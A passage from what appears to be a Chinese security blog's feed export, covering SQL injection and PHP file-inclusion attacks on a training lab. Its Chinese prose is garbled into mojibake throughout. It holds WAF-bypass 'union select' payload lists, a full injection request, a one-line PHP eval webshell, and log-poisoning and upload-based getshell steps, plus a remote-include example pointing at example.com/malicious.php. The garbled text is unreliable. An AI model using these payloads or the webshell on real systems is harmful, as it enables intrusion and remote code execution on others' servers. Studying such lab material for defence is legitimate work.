class=\"rainbow\">union/<strong>/select/</strong>/1,2</p>\n<p class=\"rainbow\">and(select 1)=(Select 0xA<em>1000)/</em>!uNIOn*//<em>!SeLECt</em>/ 1,user() </p>\n<p class=\"rainbow\">/<em>!50000union</em>//<em>!50000select</em>/1,2</p>\n<p class=\"rainbow\">/<em>!40000union</em>//<em>!40000select</em>/1,2</p>\n<p class=\"rainbow\">%0aunion%0aselect 1,2</p>\n<p class=\"rainbow\">%250aunion%250aselect 1,2</p>\n<p class=\"rainbow\">%09union%09select 1,2</p>\n<p class=\"rainbow\">%0caunion%0cselect 1,2</p>\n<p class=\"rainbow\">%0daunion%0dselect 1,2</p>\n<p class=\"rainbow\">%0baunion%0bselect 1,2</p>\n<p class=\"rainbow\">%0d%0aunion%0d%0aselect 1,2</p>\n<p class=\"rainbow\">â€“+%0d%0aunionâ€“+%0d%0aselectâ€“+%0d%0a1,â€“+%0d%0a2 /<em>!12345union</em>//<em>!12345select</em>/1,2;</p>\n<p class=\"rainbow\">/<em> ä¸­æ–‡</em> /union/<em> ä¸­æ–‡</em> /select/<em> ä¸­æ–‡</em> / 1,2;</p>\n<p class=\"rainbow\">/* <em>/union/</em> */select/ */1,2;</p>\n<p class=\"rainbow\">/<em>!union</em>//<em>!00000all</em>//<em>!00000select</em>/1,2 </p>\n<h3 id=\"unicode-ç¼–ç ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#unicode-ç¼–ç ç»•è¿‡\">#</a> <span class=\"kbd\">Unicode ç¼–ç ç»•è¿‡ </span></h3>\n<p class=\"rainbow\">å½¢å¼ï¼šâ€œ\\uâ€ æˆ–è€…æ˜¯ â€œ% uâ€ åŠ ä¸Š 4 ä½ 16 è¿›åˆ¶ Unicode ç å€¼ã€‚</p>\n<p class=\"rainbow\">iis ä¼šè‡ªåŠ¨è¿›è¡Œè¯†åˆ«è¿™ç§ç¼–ç  æœ‰éƒ¨åˆ† waf å¹¶ä¸ä¼šæ‹¦æˆªè¿™è¿™ç§ç¼–ç </p>\n<p class=\"rainbow\">-1 union select 1,user()</p>\n<p class=\"rainbow\">éƒ¨åˆ†è½¬ç </p>\n<p class=\"rainbow\">-1 uni%u006fn sel%u0065ct 1,user()</p>\n<p class=\"rainbow\">å…¨éƒ¨è½¬ç  {.rainbow}% u002d% u0031% u0020% u0075% u006e% u0069% u006f% u006e% u0020% u0073% u0065% u006c% u0065% u0063% u0074% u 0020% u0031% u002c% u0075% u0073% u0065% u0072% u0028% u0029 </p>\n<h3 id=\"url-ç¼–ç ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#url-ç¼–ç ç»•è¿‡\">#</a> <span class=\"kbd\">url ç¼–ç ç»•è¿‡ </span></h3>\n<p>åœ¨ iis é‡Œä¼šè‡ªåŠ¨æŠŠ url ç¼–ç è½¬æ¢æˆå­—ç¬¦ä¸²ä¼ åˆ°ç¨‹åºä¸­æ‰§è¡Œã€‚ ä¾‹å¦‚ union select å¯ä»¥è½¬æ¢æˆ u%6eion s%65lect  94</p>\n<p class=\"rainbow\">POST /06/vul/sqli/sqli_id.php</p>\n<p class=\"rainbow\">HTTP/1.1 Host: 192.168.0.165</p>\n<p class=\"rainbow\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0 Accept: {.rainbow}text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8</p>\n<p class=\"rainbow\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</p>\n<p class=\"rainbow\">Accept-Encoding: gzip, deflate</p>\n<p class=\"rainbow\">Content-Type: application/x-www-form-urlencoded</p>\n<p class=\"rainbow\">Content-Length: 47</p>\n<p class=\"rainbow\">Origin: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNjU=\">http://192.168.0.165</span></p>\n<p class=\"rainbow\">Connection: close Referer: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNjUvMDYvdnVsL3NxbGkvc3FsaV9pZC5waHA=\">http://192.168.0.165/06/vul/sqli/sqli_id.php</span></p>\n<p class=\"rainbow\">Cookie: PHPSESSID=hk8r159en71pndlu3jvvphenn5</p>\n<p class=\"rainbow\">Upgrade-Insecure-Requests: 1</p>\n<p class=\"rainbow\">id=-1 union%25OAselect%25OA1,user()-- &amp;submit=1</p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/10/30/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/",
            "url": "http://gyzero.shop/2023/10/30/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/",
            "title": "æ–‡ä»¶åŒ…å«æ¼æ´",
            "date_published": "2023-10-30T14:15:36.000Z",
            "content_html": "<p>æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆFile Inclusion Vulnerabilityï¼‰æ˜¯ä¸€ç§å¸¸è§çš„ç½‘ç»œå®‰å…¨æ¼æ´ï¼Œé€šå¸¸å‘ç”Ÿåœ¨ web åº”ç”¨ç¨‹åºä¸­ã€‚è¿™ç§æ¼æ´å…è®¸æ”»å‡»è€…åœ¨åº”ç”¨ç¨‹åºä¸­åŒ…å«ã€æ‰§è¡Œæˆ–æ˜¾ç¤ºæœ¬ä¸åº”è¯¥è¢«è®¿é—®çš„æ–‡ä»¶å†…å®¹ã€‚æ–‡ä»¶åŒ…å«æ¼æ´é€šå¸¸å‘ç”Ÿåœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¸­ï¼š</p>\n<ol>\n<li>æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLocal File Inclusionï¼ŒLFIï¼‰ï¼šæ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„è¯·æ±‚ï¼Œä½¿åº”ç”¨ç¨‹åºåŒ…å«æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ï¼Œé€šå¸¸æ˜¯æ•æ„Ÿæ–‡ä»¶ã€‚è¿™äº›æ–‡ä»¶å¯ä»¥åŒ…æ‹¬å¯†ç æ–‡ä»¶ã€é…ç½®æ–‡ä»¶ã€æ—¥å¿—æ–‡ä»¶ç­‰ï¼Œæ³„éœ²æ•æ„Ÿä¿¡æ¯æˆ–æ‰§è¡Œæ¶æ„ä»£ç ã€‚æ”»å‡»è€…é€šå¸¸é€šè¿‡ä¿®æ”¹ URL å‚æ•°æˆ–è¯·æ±‚å¤´æ¥å®æ–½è¿™ç§æ”»å‡»ã€‚</li>\n<li>è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆRemote File Inclusionï¼ŒRFIï¼‰ï¼šæ”»å‡»è€…åˆ©ç”¨åº”ç”¨ç¨‹åºå…è®¸åŒ…å«è¿œç¨‹æ–‡ä»¶çš„æ¼æ´ï¼Œå°†æ¶æ„ä»£ç åŒ…å«åˆ°åº”ç”¨ç¨‹åºä¸­ï¼Œä»¥æ‰§è¡Œæ”»å‡»è€…æ§åˆ¶çš„ä»£ç ã€‚é€šå¸¸ï¼Œæ”»å‡»è€…æä¾›ä¸€ä¸ªè¿œç¨‹ URLï¼Œåº”ç”¨ç¨‹åºä¼šä¸‹è½½å¹¶æ‰§è¡Œå…¶ä¸­çš„å†…å®¹ã€‚</li>\n<li>è¾“å…¥éªŒè¯å’Œè¿‡æ»¤ï¼šç¡®ä¿åº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·æä¾›çš„æ–‡ä»¶è·¯å¾„æˆ– URL è¿›è¡Œé€‚å½“çš„è¾“å…¥éªŒè¯å’Œè¿‡æ»¤ï¼Œä»¥é˜²æ­¢åŒ…å«æ¶æ„æ–‡ä»¶æˆ–è·¯å¾„ã€‚</li>\n<li>ä½¿ç”¨ç™½åå•ï¼šä»…å…è®¸åº”ç”¨ç¨‹åºåŒ…å«å·²çŸ¥å¯ä¿¡çš„æ–‡ä»¶æˆ–è·¯å¾„ï¼Œè€Œä¸æ˜¯é»‘åå•ï¼Œå› ä¸ºé»‘åå•å¯èƒ½ä¸å®Œå…¨ï¼Œæ— æ³•è¦†ç›–æ‰€æœ‰æ½œåœ¨çš„æ”»å‡»ã€‚</li>\n<li>éš”ç¦»æ–‡ä»¶ç³»ç»Ÿæƒé™ï¼šç¡®ä¿åº”ç”¨ç¨‹åºè¿è¡Œåœ¨å…·æœ‰æœ€å°æƒé™çš„å¸æˆ·ä¸Šï¼Œä»¥å‡å°‘æ”»å‡»è€…è·å–è®¿é—®æ–‡ä»¶ç³»ç»Ÿçš„æœºä¼šã€‚</li>\n<li>å®šæœŸæ›´æ–°å’Œç»´æŠ¤åº”ç”¨ç¨‹åºï¼šç¡®ä¿åº”ç”¨ç¨‹åºå’Œç›¸å…³ç»„ä»¶éƒ½æ˜¯æœ€æ–°çš„ï¼Œä»¥ä¿®å¤å·²çŸ¥çš„æ¼æ´ã€‚</li>\n<li>å®‰å…¨ç¼–ç¨‹å®è·µï¼šå¼€å‘äººå‘˜åº”å½“é‡‡ç”¨å®‰å…¨ç¼–ç¨‹å®è·µï¼Œé¿å…å°†ç”¨æˆ·æä¾›çš„è¾“å…¥ç›´æ¥ç”¨äºæ–‡ä»¶åŒ…å«æ“ä½œï¼Œå°¤å…¶æ˜¯æœªç»é€‚å½“éªŒè¯å’Œè¿‡æ»¤çš„è¾“å…¥ã€‚</li>\n<li>ä½¿ç”¨ Web åº”ç”¨ç¨‹åºé˜²ç«å¢™ï¼ˆWAFï¼‰ï¼šWAF å¯ä»¥å¸®åŠ©æ£€æµ‹å’Œé˜»æ­¢æ–‡ä»¶åŒ…å«æ¼æ´ç­‰æ”»å‡»ã€‚</li>\n</ol>\n<h3 id=\"å¸¸è§æ–‡ä»¶åŒ…å«å‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#å¸¸è§æ–‡ä»¶åŒ…å«å‡½æ•°\">#</a> <strong>å¸¸è§æ–‡ä»¶åŒ…å«å‡½æ•°</strong></h3>\n<ul>\n<li>PHPï¼š</li>\n<li>include (): ç”¨äºå°†æ–‡ä»¶åŒ…å«åˆ° PHP è„šæœ¬ä¸­ã€‚å¦‚æœåŒ…å«çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œå®ƒä¼šäº§ç”Ÿè­¦å‘Šï¼Œä½†è„šæœ¬ä¼šç»§ç»­æ‰§è¡Œã€‚</li>\n<li>require (): ä¸ include () ç±»ä¼¼ï¼Œä½†å¦‚æœåŒ…å«çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œå®ƒä¼šäº§ç”Ÿè‡´å‘½é”™è¯¯ï¼Œåœæ­¢è„šæœ¬æ‰§è¡Œã€‚</li>\n<li>include_once (): ç”¨äºåŒ…å«æ–‡ä»¶ï¼Œä½†åªåŒ…å«ä¸€æ¬¡ï¼Œä»¥é˜²æ­¢é‡å¤åŒ…å«ã€‚</li>\n<li>require_once (): ä¸ include_once () ç±»ä¼¼ï¼Œä½†åªåŒ…å«ä¸€æ¬¡ï¼Œå¹¶ä¸”å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ä¼šäº§ç”Ÿè‡´å‘½é”™è¯¯ã€‚</li>\n<li>Pythonï¼š</li>\n<li>execfile (): ç”¨äºæ‰§è¡Œ Python æ–‡ä»¶ã€‚å¯ä»¥å°†å¤–éƒ¨æ–‡ä»¶çš„ä»£ç åŠ¨æ€æ‰§è¡Œåœ¨å½“å‰ç¯å¢ƒä¸­ã€‚</li>\n<li>import: ç”¨äºå¯¼å…¥å…¶ä»– Python æ¨¡å—ã€‚è¿™é€šå¸¸æ›´å®‰å…¨ï¼Œå› ä¸º Python çš„å¯¼å…¥ç³»ç»Ÿæœ‰å†…ç½®çš„å®‰å…¨æ€§ã€‚</li>\n</ul>\n<h3 id=\"ä»£ç åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#ä»£ç åˆ†æ\">#</a> ä»£ç åˆ†æ</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$html</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$filename</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"include/<span class=\"token interpolation\"><span class=\"token variable\">$filename</span></span>\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// å˜é‡ä¼ è¿›æ¥ç›´æ¥åŒ…å«ï¼Œæ²¡åšä»»ä½•çš„å®‰å…¨é™åˆ¶</span></pre></td></tr></table></figure><ul>\n<li>\n<p>æœ¬åœ°æ–‡ä»¶åŒ…å« - åŒ…å«æœ¬åœ°çš„æ–‡ä»¶</p>\n</li>\n<li>\n<p>æœ¬åœ°æœ‰ä¸€ä¸ª shell æ–‡ä»¶å†…å®¹æ˜¯ &lt;?php phpinfo ();eval ($_POST [â€˜cmdâ€™]);&gt;</p>\n</li>\n<li>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/image.png\" alt=\"\"></p>\n</li>\n<li>\n<p>ä¼ å…¥å‚æ•°å»åŒ…å« shell,â€¦/ æ˜¯è¡¨ç¤ºä¸Šç›®å½•ï¼ŒæŸ¥æ‰¾æœ‰æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶å¦‚æœæœ‰çš„è¯å°±åŒ…å«è¿™ä¸ªæ–‡ä»¶æ‰§è¡Œé‡Œé¢çš„</p>\n</li>\n<li>\n<p>php ä»£ç å¦‚æœæ˜¯ä¸å¯æ‰§è¡Œçš„è¯è¿”å›å†…å®¹</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/3.png\" alt=\"\"></p>\n<ul>\n<li>é…åˆå›¾ç‰‡é©¬ä½¿ç”¨ä¹Ÿæ˜¯å¯ä»¥åŒ…å«æ‰§è¡Œçš„</li>\n<li>ä¸Šä¼ å›¾ç‰‡é©¬ç„¶åç”¨èš‚èšå‰‘è¿</li>\n</ul>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/4.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/5.png\" alt=\"\"></p>\n</li>\n</ul>\n<h3 id=\"åŒ…å«æ—¥å¿—æ–‡ä»¶è¿›è¡Œgetshell\"><a class=\"markdownIt-Anchor\" href=\"#åŒ…å«æ—¥å¿—æ–‡ä»¶è¿›è¡Œgetshell\">#</a> åŒ…å«æ—¥å¿—æ–‡ä»¶è¿›è¡Œ getshell</h3>\n<p>å¸¸è§çš„ä¸­é—´ä»¶å’ŒæœåŠ¡å™¨æ—¥å¿—æ–‡ä»¶çš„é»˜è®¤è·¯å¾„å¯ä»¥å› è½¯ä»¶ç‰ˆæœ¬ã€æ“ä½œç³»ç»Ÿå’Œé…ç½®è€Œå¼‚ï¼Œä½†é€šå¸¸ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„é»˜è®¤æ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼š</p>\n<ol>\n<li>Apache HTTP Server:</li>\n</ol>\n<ul>\n<li>\n<p>é”™è¯¯æ—¥å¿—æ–‡ä»¶: /var/log/apache2/error.log (Debian/Ubuntu) æˆ– /var/log/httpd/error_log (CentOS/RHEL)</p>\n<p>è®¿é—®æ—¥å¿—æ–‡ä»¶: /var/log/apache2/access.log (Debian/Ubuntu) æˆ– /var/log/httpd/access_log (CentOS/RHEL)</p>\n</li>\n</ul>\n<ol>\n<li>\n<p>Nginx:</p>\n</li>\n<li>\n<p>é”™è¯¯æ—¥å¿—æ–‡ä»¶: /var/log/nginx/error.log</p>\n</li>\n<li>\n<p>è®¿é—®æ—¥å¿—æ–‡ä»¶: /var/log/nginx/access.log</p>\n</li>\n<li>\n<p>Tomcat:</p>\n</li>\n</ol>\n<ul>\n<li>\n<p>é”™è¯¯æ—¥å¿—æ–‡ä»¶:$CATALINA_BASE/logs/catalina.outï¼ˆé€šå¸¸åœ¨ catalina.out æˆ– catalina.log æ–‡ä»¶ä¸­ï¼‰</p>\n<p>è®¿é—®æ—¥å¿—æ–‡ä»¶: $CATALINA_BASE/logs/access_log</p>\n</li>\n</ul>\n<ol>\n<li>é”™è¯¯æ—¥å¿—ï¼š</li>\n</ol>\n<ul>\n<li>é»˜è®¤æƒ…å†µä¸‹ï¼ŒIIS çš„é”™è¯¯æ—¥å¿—é€šå¸¸ä½äº % SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC#\\ ç›®å½•ä¸­ï¼Œå…¶ä¸­ ** <strong>#</strong> ** ä»£è¡¨ç«™ç‚¹çš„å”¯ä¸€ IDã€‚é€šå¸¸ï¼Œè¿™ä¸ªç›®å½•ä¸­ä¼šæœ‰å¤šä¸ªå­ç›®å½•ï¼Œæ¯ä¸ªå­ç›®å½•å¯¹åº”ä¸€ä¸ªä¸åŒçš„ç«™ç‚¹ã€‚</li>\n</ul>\n<ol>\n<li>è®¿é—®æ—¥å¿—ï¼š</li>\n</ol>\n<ul>\n<li>è®¿é—®æ—¥å¿—é€šå¸¸ä¹Ÿå­˜å‚¨åœ¨ä¸é”™è¯¯æ—¥å¿—ç›¸åŒçš„ç›®å½•ä¸­ï¼Œå³ % SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC#ã€‚è¿™é‡Œçš„ # ä»ç„¶ä»£è¡¨ç«™ç‚¹çš„å”¯ä¸€ IDã€‚é€šå¸¸ï¼Œè®¿é—®æ—¥å¿—æ–‡ä»¶ä»¥ u_exYYMMDD.log æ ¼å¼çš„æ–¹å¼å‘½åï¼Œå…¶ä¸­ YYMMDD ä»£è¡¨æ—¥æœŸã€‚</li>\n</ul>\n<ol>\n<li>ç”¨ burp æŠ“åŒ…ç„¶åæŠŠæäº¤çš„å‚æ•°å†™æˆä¸€å¥è¯æœ¨é©¬<?php phpinfo();eval($_POST['cmd']);?></li>\n<li>ç„¶å apache æœåŠ¡å™¨æ—¥å¿—é‡Œä¼šæœ‰è¿™æ ·çš„è®°å½• 127.0.0.1 - - [30/Oct/2023:17:51:19 +0800] â€œGET /vul/fileinclude/fi_local.php?filename=<?php phpinfo();eval($_POST['cmd']);?>&amp;submit=% E6%8F%90% E4% BA% A4% E6%9F% A5% E8% AF% A2â€ 400 2220 é‡Œä¼šæœ‰æˆ‘ä»¬åˆšæ‰æäº¤çš„ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨æ–‡ä»¶åŒ…å«å»åŒ…å«</li>\n<li>è¿™ä¸ªæ—¥å¿—æ–‡ä»¶é‡Œé¢çš„ä¸€å¥è¯å°±ä¼šè¢«æ‰§è¡Œé”™è¯¯æ—¥å¿—ä¹Ÿå¯ä»¥ï¼ˆå‰ææ˜¯è¦æœ‰æƒé™ï¼‰</li>\n</ol>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/6.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/7.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/8.png\" alt=\"\"></p>\n<h3 id=\"é…åˆæ–‡ä»¶ä¸Šä¼ æ¼æ´getshell\"><a class=\"markdownIt-Anchor\" href=\"#é…åˆæ–‡ä»¶ä¸Šä¼ æ¼æ´getshell\">#</a> é…åˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ getshell</h3>\n<p>æ–‡ä»¶ä¸Šä¼ ä¸€ä¸ª txt æ–‡æœ¬æˆ–è€…å›¾ç‰‡é‡Œé¢æ·»åŠ ä¸€å¥è¯æœ¨é©¬</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/9.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/10.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/11.png\" alt=\"\"></p>\n<h3 id=\"ä¼ªåè®®\"><a class=\"markdownIt-Anchor\" href=\"#ä¼ªåè®®\">#</a> ä¼ªåè®®</h3>\n<ol>\n<li>file://:</li>\n</ol>\n<ul>\n<li>ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶ã€‚åœ¨æ–‡ä»¶åŒ…å«æ¼æ´æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½å°è¯•ä½¿ç”¨è¿™ä¸ªåè®®æ¥åŒ…å«æ¶æ„æ–‡ä»¶ã€‚</li>\n</ul>\n<ol>\n<li>http:// å’Œ https://:</li>\n</ol>\n<ul>\n<li>ç”¨äºè®¿é—® HTTP å’Œ HTTPS URL èµ„æºã€‚è¿™äº›åè®®é€šå¸¸ç”¨äºä» Web æœåŠ¡å™¨ä¸Šè·å–æ•°æ®ã€‚</li>\n</ul>\n<ol>\n<li>ftp:// å’Œ ftps://:</li>\n</ol>\n<ul>\n<li>ç”¨äºè®¿é—® FTP å’Œ FTPS URLsï¼Œå¯ä»¥ç”¨äºä¸Šä¼ å’Œä¸‹è½½æ–‡ä»¶ã€‚</li>\n</ul>\n<ol>\n<li>php://:</li>\n</ol>\n<ul>\n<li>ç”¨äºè®¿é—®å„ç§è¾“å…¥ / è¾“å‡ºæµï¼Œå¦‚ php://input å’Œ php://outputï¼Œåœ¨ PHP ä¸­æ‰§è¡Œæ–‡ä»¶æ“ä½œæ—¶éå¸¸æœ‰ç”¨ã€‚</li>\n</ul>\n<ol>\n<li>zlib://:</li>\n</ol>\n<ul>\n<li>ç”¨äºå‹ç¼©å’Œè§£å‹ç¼©æµã€‚</li>\n</ul>\n<ol>\n<li>data://:</li>\n</ol>\n<ul>\n<li>ç”¨äºå¤„ç†æ•°æ® URLï¼Œå…è®¸å°†æ•°æ®ç›´æ¥åµŒå…¥åˆ° URL ä¸­ã€‚</li>\n</ul>\n<ol>\n<li>glob://:</li>\n</ol>\n<ul>\n<li>ç”¨äºæŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ï¼Œé€šå¸¸ç”¨äºæ–‡ä»¶æ“ä½œã€‚</li>\n</ul>\n<ol>\n<li>phar://:</li>\n</ol>\n<ul>\n<li>ç”¨äºå¤„ç† PHP å½’æ¡£æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºåŒ…å« PHP åº“å’Œèµ„æºã€‚</li>\n</ul>\n<ol>\n<li>ssh2://:</li>\n</ol>\n<ul>\n<li>ç”¨äº SSH2 åè®®ï¼Œå¯ç”¨äºå®‰å…¨çš„ Shell è®¿é—®å’Œæ–‡ä»¶ä¼ è¾“ã€‚</li>\n</ul>\n<ol>\n<li>rar://:</li>\n</ol>\n<ul>\n<li>ç”¨äºå¤„ç† RAR æ–‡ä»¶ã€‚</li>\n</ul>\n<ol>\n<li>ogg://:</li>\n</ol>\n<ul>\n<li>ç”¨äºå¤„ç†éŸ³é¢‘æµï¼Œç‰¹åˆ«æ˜¯ Ogg Vorbis éŸ³é¢‘æ–‡ä»¶ã€‚</li>\n</ul>\n<ol>\n<li>expect://:</li>\n</ol>\n<ul>\n<li>\n<p>ç”¨äºå¤„ç†äº¤äº’å¼æµï¼Œé€šå¸¸ç”¨äºè‡ªåŠ¨åŒ–è„šæœ¬ã€‚</p>\n</li>\n<li>\n<h3 id=\"phpiniè®¾ç½®\"><a class=\"markdownIt-Anchor\" href=\"#phpiniè®¾ç½®\">#</a> php.ini è®¾ç½®</h3>\n<p>allow_url_fopen å’Œ allow_url_include æ˜¯ PHP é…ç½®é€‰é¡¹ï¼Œç”¨äºæ§åˆ¶æ˜¯å¦å…è®¸åœ¨ä»£ç ä¸­è®¿é—®è¿œç¨‹èµ„æºå’ŒåŒ…å«è¿œç¨‹æ–‡ä»¶ã€‚è¿™ä¸¤ä¸ªé€‰é¡¹ä¸å®‰å…¨æ€§æœ‰å…³ï¼Œå› ä¸ºå®ƒä»¬å¯ä»¥å½±å“åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§ã€‚ä¸‹é¢åˆ†åˆ«ä»‹ç»è¿™ä¸¤ä¸ªé€‰é¡¹ï¼š</p>\n<ol>\n<li>allow_url_fopen:</li>\n</ol>\n<ul>\n<li>allow_url_fopen æ˜¯ä¸€ä¸ª PHP é…ç½®é€‰é¡¹ï¼Œç”¨äºæ§åˆ¶æ˜¯å¦å…è®¸é€šè¿‡ fopen () å‡½æ•°æˆ–å…¶ä»–æ–‡ä»¶å¤„ç†å‡½æ•°æ¥è®¿é—®è¿œç¨‹èµ„æºã€‚å¦‚æœè¿™ä¸ªé€‰é¡¹è¢«å¯ç”¨ï¼ˆè®¾ç½®ä¸º 1ï¼‰ï¼ŒPHP å…è®¸åœ¨ä»£ç ä¸­ä½¿ç”¨ç±»ä¼¼ fopen (â€œ<span class=\"exturl\" data-url=\"aHR0cDovL2V4YW1wbGUuY29tL3Jlc291cmNl\">http://example.com/resource</span>â€, â€œrâ€) çš„æ–¹å¼æ‰“å¼€è¿œç¨‹ URLï¼Œå¹¶è¯»å–å®ƒä»¬çš„å†…å®¹ã€‚å¦‚æœç¦ç”¨ï¼ˆè®¾ç½®ä¸º 0ï¼‰ï¼ŒPHP å°†ä¸å…è®¸è¿™æ ·çš„æ“ä½œã€‚\n<ul>\n<li>éœ€è¦å°å¿ƒï¼Œå› ä¸ºå¯ç”¨ allow_url_fopen å¯èƒ½ä¼šå¯¼è‡´å®‰å…¨é£é™©ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†ç”¨æˆ·æä¾›çš„ URL æ—¶ã€‚æ”»å‡»è€…å¯èƒ½å°è¯•åŒ…å«æ¶æ„è¿œç¨‹æ–‡ä»¶æˆ–æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä»è€Œå¼•å‘å®‰å…¨é—®é¢˜ã€‚</li>\n</ul>\n</li>\n</ul>\n<ol>\n<li>allow_url_include:</li>\n</ol>\n<ul>\n<li>\n<p>allow_url_include æ˜¯å¦ä¸€ä¸ª PHP é…ç½®é€‰é¡¹ï¼Œå®ƒæ§åˆ¶æ˜¯å¦å…è®¸é€šè¿‡ include å’Œ require å‡½æ•°åŒ…å«è¿œç¨‹æ–‡ä»¶ï¼Œå¦‚ include â€œ<span class=\"exturl\" data-url=\"aHR0cDovL2V4YW1wbGUuY29tL21hbGljaW91cy5waHA=\">http://example.com/malicious.php</span>â€;ã€‚å¦‚æœå¯ç”¨ï¼ˆè®¾ç½®ä¸º 1ï¼‰ï¼ŒPHP å…è®¸åŒ…å«è¿œç¨‹æ–‡ä»¶ã€‚å¦‚æœç¦ç”¨ï¼ˆè®¾ç½®ä¸º 0ï¼‰ï¼ŒPHP å°†ä¸å…è®¸åŒ…å«è¿œç¨‹æ–‡ä»¶ã€‚</p>\n<ul>\n<li>å¯ç”¨ allow_url_include å¯èƒ½ä¼šå¼•å‘å®‰å…¨é£é™©ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥å°è¯•åŒ…å«è¿œç¨‹æ¶æ„ä»£ç .</li>\n</ul>\n</li>\n<li>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/12.png\" alt=\"\"></p>\n<h3 id=\"åè®®ç”¨æ³•\"><a class=\"markdownIt-Anchor\" href=\"#åè®®ç”¨æ³•\">#</a> åè®®ç”¨æ³•</h3>\n<h4 id=\"phpinput\"><a class=\"markdownIt-Anchor\" href=\"#phpinput\">#</a> php://input</h4>\n<ol>\n<li>php.ini æ¡ä»¶æ˜¯ allow_url_fopen =ON allow_url_include=ON</li>\n<li>é‡åˆ° file_get_contents () è¦æƒ³åˆ°ç”¨ php://input ç»•è¿‡</li>\n<li>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°† post è¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸º PHP ä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸º php://input, 